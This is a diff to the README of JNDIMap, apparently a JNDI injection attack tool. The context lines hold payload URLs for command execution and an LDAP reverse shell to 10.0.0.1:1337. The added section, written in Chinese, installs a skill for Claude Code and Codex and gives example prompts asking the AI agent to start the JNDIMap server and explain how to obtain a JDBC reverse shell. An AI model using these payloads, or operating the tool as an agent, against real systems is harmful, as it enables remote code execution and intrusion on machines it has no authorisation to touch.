@@ -32,6 +32,21 @@ rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
 ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 ```
 
+## 💡 Skills
+
+通过 Claude Code 或 Codex 使用 JNDIMap
+
+```bash
+# 安装 Skill
+npx skills add X1r0z/JNDIMap -g
+
+# Claude Code
+claude '/jndi-map 启动 JNDIMap 服务器并告诉我在 10.0.0.1:1337 上使用 JDBC 反弹 shell 的方式'
+
+# Codex
+codex '$jndi-map 启动 JNDIMap 服务器并告诉我在 10.0.0.1:1337 上使用 JDBC 反弹 shell 的方式'
+```
+
 ## 🚩 功能特性
 
 - DNSLog
